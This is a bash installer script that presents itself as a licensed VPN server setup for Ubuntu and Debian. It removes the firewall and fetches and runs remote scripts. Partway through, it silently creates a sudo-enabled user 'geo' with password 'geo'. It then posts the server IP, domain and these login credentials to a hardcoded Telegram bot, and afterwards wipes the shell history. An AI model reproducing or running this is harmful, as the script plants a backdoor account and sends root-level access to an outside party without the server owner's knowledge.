#!/bin/bash
# Color Validation
Lred='\e[1;91m'
Lgreen='\e[92m'
Lyellow='\e[93m'
green='\e[32m'
RED='\033[0;31m'
NC='\033[0m'
BGBLUE='\e[1;44m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0;37m'
# ===================
clear
  # // Exporint IP AddressInformation
export IP=$( curl -sS ipinfo.io/ip )

# // Clear Data
clear
clear && clear && clear
clear;clear;clear

  # // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  Welcome To Geo Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "         Auther : ${green}MUHAMMAD AMIN ${NC}${YELLOW}(${NC} ${green}Geo Project ${NC}${YELLOW})${NC}"
echo -e "       © Recode By Geo Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""

# // Checking Os Architecture
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
    exit 1
fi

# // Checking System
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
    exit 1
fi

# // IP Address Validating
if [[ $IP == "" ]]; then
    echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
else
    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
fi

# // Validate Successfull
echo ""
read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
echo ""
clear
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
#IZIN SCRIPT
MYIP=$(curl -sS ipv4.icanhazip.com)
echo -e "\e[32mloading...\e[0m"
clear
#IZIN SCRIPT
MYIP=$(curl -sS ipv4.icanhazip.com)
echo -e "\e[32mloading...\e[0m"
clear
# Version sc
VERSIONSC () {
    GEOVPN=V3.0
    IZINVERSION=$(curl https://raw.githubusercontent.com/jaka1m/ipmulti/main/ip | grep $MYIP | awk '{print $6}')
    if [ $GEOVPN = $IZINVERSION ]; then
    echo -e "\e[32mReady for script installation version 3.0 (websocket)..\e[0m"
    else
    echo -e "\e[31mYou do not have permission to install script version 3.0 !\e[0m"
    exit 0
fi
}
# Valid Script
VALIDITY () {
    today=`date -d "0 days" +"%Y-%m-%d"`
    Exp1=$(curl https://raw.githubusercontent.com/jaka1m/ipmulti/main/ip | grep $MYIP | awk '{print $4}')
    if [[ $today < $Exp1 ]]; then
    echo -e "\e[32mYOUR SCRIPT ACTIVE..\e[0m"
	VERSIONSC
    else
    echo -e "\e[31mScript Anda Telah Expired !!\e[0m";
    echo -e "\e[31mTolong Renew Script di  @tau_samawa\e[0m"
    exit 0
fi
}
IZIN=$(curl https://raw.githubusercontent.com/jaka1m/ipmulti/main/ip | awk '{print $5}' | grep $MYIP)
if [ $MYIP = $IZIN ]; then
echo -e "\e[32mPERMISSION ACCEPT...\e[0m"
sleep 3
VALIDITY
clear
else
clear
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "                PERMISSION DENIED ! "
echo -e "     Your VPS ${NC}( ${green}$IP${NC} ) ${YELLOW}Has been Banned "
echo -e "         Buy access permissions for scripts "
echo -e "                 Contact Admin :"
echo -e "             ${green}Telegram t.me/tau_samawa "
echo -e "             WhatsApp wa.me/6282339191527"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
rm -f setup.sh
exit 0
fi
clear
echo -e "\e[32mloading...\e[0m"
clear
apt install p7zip-full -y
apt upgrade -y
apt dist-upgrade -y
apt-get remove --purge ufw firewalld -y
apt-get remove --purge exim4 -y
sudo apt-get remove --purge exim4 -y
apt -y install jq
apt -y install wget curl
apt install git -y

# // Ram Information
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"

# // Go To Root Directory
cd /root/

clear
rm -r /var/lib/geovpnstore > /dev/null 2>&1
mkdir /var/lib/geovpnstore;
echo "IP=" >> /var/lib/geovpnstore/ipvps.conf
sleep 4
#DOWNLOAD SOURCE SCRIPT
clear
# // Starting Setup Domain
echo -e "${green}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Anda Ingin Menggunakan Domain Pribadi ?"
echo -e "Atau Ingin Menggunakan Domain Otomatis ?"
echo -e "Jika Ingin Menggunakan Domain Pribadi, Ketik ${green}2${NC}"
echo -e "dan Jika Ingin menggunakan Domain Otomatis, Ketik ${green}1${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${green}English Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "You Want to Use a Private Domain ?"
echo -e "Or Want to Use Auto Domain ?"
echo -e "If You Want Using Private Domain, Type ${green}2${NC}"
echo -e "else You Want using Automatic Domain, Type ${green}1${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
read -rp "Choose Your Domain Installation : " dom 

if test $dom -eq 1; then
clear
# // Setup CF
echo -e "${green}DOWNLOADING CLOUDFLARE!${NC}"
sleep 3
wget -q https://jaka1m.github.io/project/mantap/cf.sh && chmod +x cf.sh && ./cf.sh
echo -e "${green}Done!${NC}"
sleep 2
clear
elif test $dom -eq 2; then
clear
echo -e "${green}Indonesian Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Silakan Pointing Domain Anda Ke IP VPS"
echo -e "Untuk Caranya Arahkan NS Domain Ke Cloudflare"
echo -e "Kemudian Tambahkan A Record Dengan IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo -e "${green}English Language${NC}"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo -e "Please Point Your Domain To IP VPS"
echo -e "For Point NS Domain To Cloudflare"
echo -e "Change NameServer On Domain To Cloudflare"
echo -e "Then Add A Record With IP VPS"
echo -e "${YELLOW}-----------------------------------------------------${NC}"
echo ""
echo ""
read -rp "Enter Your Domain : " domen 
echo $domen > /root/domain
else 
echo "Not Found Argument"
exit 1
fi
echo -e "${green}Done!${NC}"
#install
domain=$(cat /root/domain)
# // Make Script User
userdel fsid > /dev/null 2>&1
Username="geo"
Password=geo
#Password=$(cat /proc/sys/kernel/random/uuid)
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

##########
CHATID="5491480146"
KEY="5836352998:AAGoAab11_hTcF652rNJbG-WoHaPaJknDhU"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="Installasi VPN Script Stable V3.0
============================
<code>Username   : $user
Tanggal    : $tanggal</code>
============================
<code>Hostname   : ${HOSTNAME}
NET Iface  : $NETWORK_IFACE
IP VPS     : $IP
OS VPS     : $OS_Name
Kernel     : $Kernel
Arch       : $Arch
Ram Used   : $Ram_Usage MB
Ram Left   : $Ram_Total MB</code>
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP VPS     :</code> <code>$IP</code>
<code>User Login :</code> <code>$Username</code>
<code>Pass Login :</code> <code>$Password</code>
============================
(C) Copyright 2022 By Geo Project
============================
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null

clear
sleep 2
clear
echo -e "${green}Done!${NC}"
sleep 2
clear
# // Setup SSH-VPN
echo -e "${green}DOWNLOADING SSH-VPN!${NC}"
sleep 3
wget -q -O /root/ssh-vpn.sh "https://jaka1m.github.io/project/mantap/ssh-vpn.sh"
chmod +x /root/ssh-vpn.sh
./ssh-vpn.sh
echo -e "${green}Done!${NC}"
sleep 2
clear
# // Setup XRAY
echo -e "${green}INSTALLING XRAY${NC}"
sleep 3
wget https://jaka1m.github.io/project/mantap/xray.sh && chmod +x xray.sh && screen -S xray ./xray.sh
echo -e "${green}Done!${NC}"
sleep 2
clear
# // Setup BACKUP
echo -e "${green}INSTALLING BACKUP${NC}"
sleep 3
wget https://jaka1m.github.io/project/mantap/set-br.sh && chmod +x set-br.sh && screen -S set-br ./set-br.sh
echo -e "${green}Done!${NC}"
sleep 2
clear
# // Setup OHP
echo -e "${green}INSTALLING OHP${NC}"
sleep 3
wget https://jaka1m.github.io/project/mantap/ohp.sh && chmod +x ohp.sh && screen -S ohp ./ohp.sh
echo -e "${green}Done!${NC}"
sleep 2
clear
systemctl start nginx > /dev/null 2>&1

# // Remove Not Used Files
rm -f /root/setup.sh > /dev/null 2>&1
rm -r /root/menu > /dev/null 2>&1
rm -r /root/menu.zip > /dev/null 2>&1
rm -r -f *.sh > /dev/null 2>&1
echo " "
echo "=================-geovpn Project-==================" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "================================================" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 443, 22"  | tee -a log-install.txt
echo "   - OpenVPN                 : TCP 1194, UDP 2200, SSL 990"  | tee -a log-install.txt
echo "   - Stunnel5                : 443, 222, 777"  | tee -a log-install.txt
echo "   - Dropbear                : 443, 109, 143"  | tee -a log-install.txt
echo "   - Squid Proxy             : 3128, 8080"  | tee -a log-install.txt
echo "   - Badvpn                  : 7100, 7200, 7300"  | tee -a log-install.txt
echo "   - Nginx                   : 89"  | tee -a log-install.txt
#echo "   - Wireguard               : 7070"  | tee -a log-install.txt
#echo "   - L2TP/IPSEC VPN          : 1701"  | tee -a log-install.txt
#echo "   - PPTP VPN                : 1732"  | tee -a log-install.txt
#echo "   - SSTP VPN                : 444"  | tee -a log-install.txt
#echo "   - Shadowsocks-R           : 1443-1543"  | tee -a log-install.txt
#echo "   - SS-OBFS TLS             : 2443-2543"  | tee -a log-install.txt
#echo "   - SS-OBFS HTTP            : 3443-3543"  | tee -a log-install.txt
echo "   - XRAYS Vmess TLS         : 8443"  | tee -a log-install.txt
echo "   - XRAYS Vmess None TLS    : 8880"  | tee -a log-install.txt
echo "   - XRAYS Vless TLS         : 2083"  | tee -a log-install.txt
echo "   - XRAYS Vless None TLS    : 2095"  | tee -a log-install.txt
echo "   - XRAYS Trojan            : 2087"  | tee -a log-install.txt
echo "   - Websocket TLS           : 443"   | tee -a log-install.txt
echo "   - Websocket None TLS      : 80"  | tee -a log-install.txt
echo "   - Websocket Ovpn          : 2086"  | tee -a log-install.txt
echo "   - OHP_SSH                 : 8181"  | tee -a log-install.txt
echo "   - OHP_Dropbear            : 8282"  | tee -a log-install.txt
echo "   - OHP_OpenVPN             : 8383"  | tee -a log-install.txt
echo "   - Tr Go                   : 2053"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On 05.00 GMT +7" | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "   - White Label" | tee -a log-install.txt
echo "   - Installation Log --> /root/log-install.txt"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   - Dev/Main                : ~"  | tee -a log-install.txt
echo "   - Recode                  : Muhammad Amin" | tee -a log-install.txt
echo "   - Telegram                : T.me/sampiiiiu"  | tee -a log-install.txt
echo "   - Instagram               : @geo_gabuter"  | tee -a log-install.txt
echo "   - Whatsapp                : 082339191527"  | tee -a log-install.txt
echo "   - Facebook                : Muhammad Amin" | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo ""
echo "===============-[ Script Mod By Geo Project ]-==============="
echo -e ""
# // Download welcome
    echo "clear" >>.profile
    echo "neofetch --ascii_distro Anarchy" >>.profile
    echo "echo by Geo Project " >>.profile
    echo "" >>.profile
    echo "" >>.profile

# // Done
history -c
rm -f /root/.bash
rm -f /root/.bash_history
rm -f /root/ssh-vpn.sh
rm -f /root/sstp.sh
rm -f /root/wg.sh
rm -f /root/ss.sh
rm -f /root/ssr.sh
rm -f /root/xray.sh
rm -f /root/ipsec.sh
rm -f /root/set-br.sh
rm -f /root/edu.sh
rm -f /root/ohp.sh
echo -e "${OKEY} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${green}Enter${NC} ${CYAN}]${NC} For Reboot") "
reboot
